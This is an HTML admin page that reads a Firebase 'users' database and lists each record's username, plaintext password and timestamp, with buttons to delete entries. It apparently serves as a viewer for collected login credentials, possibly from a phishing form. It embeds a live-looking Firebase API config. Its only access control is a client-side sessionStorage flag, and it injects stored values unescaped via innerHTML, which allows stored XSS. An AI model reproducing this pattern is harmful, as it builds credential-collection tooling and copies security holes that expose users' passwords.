<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authorized Users</title>
  <style>
    body { font-family: sans-serif; margin: 2em; }
    h2 { margin-top: 0; }
    #entriesBox { border: 1px solid #ccc; padding: 1em; border-radius: 6px; }
    .entry { border-bottom: 1px solid #ddd; padding: 0.5em 0; }
    .entry:last-child { border-bottom: none; }
    button { margin-top: 1em; }
  </style>
</head>
<body>

  <h2>Authorized Users</h2>
  <div id="entriesBox"><p>Loading entries...</p></div>
  <button id="clear">Clear All</button>
  <button id="logout">Logout</button>
  <button id="clearm">Clear messages</button>
<!-- Firebase SDKs -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyBGPFSP0e0oYqKqvJHLB5eGlX9mJ8aU09s",
  authDomain: "test-da143.firebaseapp.com",
  databaseURL: "https://test-da143-default-rtdb.firebaseio.com",
  projectId: "test-da143",
  storageBucket: "test-da143.firebasestorage.app",
  messagingSenderId: "58366480447",
  appId: "1:58366480447:web:f3dd12850f09952b49688a"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Restrict access
if (sessionStorage.getItem("adminAccess") !== "true") {
  alert("Access denied.");
  window.location.href = "index.html";
}

const box = document.getElementById("entriesBox");

function render(data) {
  box.innerHTML = "";
  if (!data) return box.innerHTML = "<p>No entries yet.</p>";
  const entries = Object.entries(data).sort((a,b)=>b[1].timestamp-a[1].timestamp);
  for (const [key,val] of entries) {
    const div = document.createElement("div");
    div.className = "entry";
    div.innerHTML = `
      <strong>${val.username}</strong><br>
      <em>${val.password}</em><br>
      <small>${new Date(val.timestamp).toLocaleString()}</small><br>
      <button onclick="deleteEntry('${key}')">Delete</button>
    `;
    box.appendChild(div);
  }
}

db.ref("users").on("value", snap => render(snap.val()));

function deleteEntry(id) {
  if (confirm("Delete this entry?")) db.ref("users/"+id).remove();
}

document.getElementById("clear").onclick = () => {
  if (confirm("Clear all entries?")) db.ref("users").remove();
};

document.getElementById("logout").onclick = () => {
  sessionStorage.removeItem("adminAccess");
  window.location.href = "index.html";
};

// Auto logout after 20 minutes
setTimeout(() => {
  sessionStorage.removeItem("adminAccess");
  alert("Session expired. Please log in again.");
  window.location.href = "index.html";
}, 20 * 60 * 1000);
</script>


</body>
</html>
